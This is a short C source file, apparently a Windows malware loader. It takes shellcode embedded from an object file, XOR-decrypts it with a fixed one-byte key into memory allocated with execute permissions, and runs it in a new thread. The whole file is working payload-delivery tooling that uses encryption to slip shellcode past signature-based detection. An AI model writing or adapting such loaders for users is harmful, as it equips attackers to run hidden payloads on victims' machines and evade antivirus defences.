// very simple c loader, decrypts the shellcode and executes it.

#include <windows.h>
#include <stdio.h>

// grab the encrypted shellcode symbols from the .o file using gcc

// Encrypted shellcode symbols from .o file
extern unsigned char _binary_shellcode_enc_start[];
extern unsigned char _binary_shellcode_enc_end[];

int main() {
    unsigned char xor_key = 0xAA;
    SIZE_T shellcode_size = _binary_shellcode_enc_end - _binary_shellcode_enc_start;

    // Allocate memory with RWX permissions to execute the shellcode
    LPVOID exec_mem = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) {
        MessageBoxA(NULL, "VirtualAlloc failed.", "Error", MB_ICONERROR);
        return -1;
    }

    // Decrypt the shellcode into memory
    for (SIZE_T i = 0; i < shellcode_size; i++) {
        ((unsigned char*)exec_mem)[i] = _binary_shellcode_enc_start[i] ^ xor_key;
    }

    // Execute the shellcode
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (!thread) {
        MessageBoxA(NULL, "CreateThread failed.", "Error", MB_ICONERROR);
        return -1;
    }

    WaitForSingleObject(thread, INFINITE);
    return 0;
}

